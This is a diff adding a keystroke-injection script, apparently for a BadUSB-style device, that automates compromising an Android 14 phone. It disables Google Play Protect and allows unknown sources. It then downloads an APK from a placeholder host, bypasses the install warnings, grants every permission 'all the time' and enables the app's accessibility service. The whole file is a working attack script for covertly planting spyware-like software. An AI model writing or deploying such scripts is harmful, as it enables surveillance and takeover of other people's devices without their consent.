@@ -1,0 +1,276 @@
+REM APK Installer for Android 14
+REM Author: Cascade
+REM Version: 1.0
+REM Optimized for Android 14's security model and UI
+
+REM ---- INITIAL SETUP ----
+DELAY 1500
+
+REM Wake up the device
+ENTER
+DELAY 500
+ENTER
+DELAY 1000
+
+REM Swipe up to unlock (Android 14 method)
+SWIPE 500 1800 500 800
+DELAY 1500
+
+REM ---- STEP 1: DISABLE GOOGLE PLAY PROTECT (ANDROID 14 PATH) ----
+
+REM Open Google Play Store
+HOME
+DELAY 800
+SWIPE 500 1700 500 700
+DELAY 1000
+STRING play store
+DELAY 800
+ENTER
+DELAY 3000
+
+REM Access user profile (Android 14 UI)
+STRING profile
+DELAY 800
+TAB
+DELAY 300
+TAB
+DELAY 300
+ENTER
+DELAY 1500
+
+REM Navigate to Play Protect in Android 14
+STRING settings
+DELAY 800
+ENTER
+DELAY 1500
+STRING play protect
+DELAY 800
+ENTER
+DELAY 2000
+
+REM Tap settings gear (Android 14 position)
+TAB
+DELAY 300
+TAB
+DELAY 300
+TAB
+DELAY 300
+ENTER
+DELAY 1500
+
+REM Disable "Scan apps" toggle (Android 14 UI)
+TAB
+DELAY 300
+ENTER
+DELAY 1000
+
+REM Confirm with "Turn off" button
+TAB
+DELAY 300
+TAB
+DELAY 300
+STRING turn off
+DELAY 800
+ENTER
+DELAY 1500
+
+REM ---- STEP 2: ENABLE UNKNOWN SOURCES (ANDROID 14 PATH) ----
+
+REM Go to Settings
+HOME
+DELAY 800
+SWIPE 500 1700 500 700
+DELAY 1000
+STRING settings
+DELAY 800
+ENTER
+DELAY 2000
+
+REM Navigate to Apps section in Android 14
+STRING apps
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Special app access in Android 14
+STRING special app access
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Find "Install unknown apps" in Android 14
+STRING install unknown
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Select Chrome in Android 14
+STRING chrome
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Enable permission (Android 14 toggle)
+TAB
+DELAY 300
+ENTER
+DELAY 1000
+
+REM ---- STEP 3: OPEN CHROME AND DOWNLOAD APK (ANDROID 14) ----
+
+REM Open Chrome
+HOME
+DELAY 800
+SWIPE 500 1700 500 700
+DELAY 1000
+STRING chrome
+DELAY 800
+ENTER
+DELAY 3000
+
+REM Access the address bar in Android 14
+TAB
+DELAY 500
+ENTER
+DELAY 1000
+
+REM Enter the direct APK URL
+STRING https://example.com/app.apk
+DELAY 1000
+ENTER
+DELAY 5000
+
+REM Wait for download to start and complete (longer for Android 14)
+DELAY 12000
+
+REM ---- STEP 4: HANDLE ANDROID 14 SECURITY PROMPTS ----
+
+REM Open notification shade (Android 14 gesture)
+SWIPE 500 100 500 1700
+DELAY 1500
+
+REM Tap on download complete notification
+ENTER
+DELAY 3000
+
+REM Handle Android 14 security warning
+STRING install anyway
+DELAY 800
+TAB
+DELAY 300
+TAB
+DELAY 300
+ENTER
+DELAY 3000
+
+REM Confirm installation despite warning
+TAB
+DELAY 300
+TAB
+DELAY 300
+STRING install
+DELAY 800
+ENTER
+DELAY 5000
+
+REM ---- STEP 5: GRANT PERMISSIONS (ANDROID 14 PERMISSION MODEL) ----
+
+REM Go to Settings for Android 14 permission management
+HOME
+DELAY 800
+SWIPE 500 1700 500 700
+DELAY 1000
+STRING settings
+DELAY 800
+ENTER
+DELAY 2000
+
+REM Navigate to Apps in Android 14
+STRING apps
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Find the newly installed app
+STRING app
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Go to Permissions in Android 14
+STRING permissions
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Handle Android 14's granular permission model
+REPEAT 8 {
+    TAB
+    DELAY 300
+    ENTER
+    DELAY 1000
+    STRING allow all the time
+    DELAY 500
+    ENTER
+    DELAY 800
+    BACK
+    DELAY 800
+}
+
+REM ---- STEP 6: ENABLE ACCESSIBILITY (ANDROID 14 PATH) ----
+
+REM Go to Settings
+HOME
+DELAY 800
+SWIPE 500 1700 500 700
+DELAY 1000
+STRING settings
+DELAY 800
+ENTER
+DELAY 2000
+
+REM Navigate to Accessibility in Android 14
+STRING accessibility
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Find installed app in Android 14 accessibility list
+STRING app
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Enable service in Android 14
+TAB
+DELAY 300
+ENTER
+DELAY 1000
+
+REM Confirm enabling (Android 14 dialog)
+STRING allow
+DELAY 800
+TAB
+DELAY 300
+TAB
+DELAY 300
+ENTER
+DELAY 2000
+
+REM ---- STEP 7: LAUNCH APP ON ANDROID 14 ----
+
+REM Return to home screen
+HOME
+DELAY 800
+
+REM Open app drawer (Android 14 gesture)
+SWIPE 500 1700 500 700
+DELAY 1000
+
+REM Open the app
+STRING app
+DELAY 800
+ENTER
+DELAY 2000
+
+REM ---- FINISHED ----
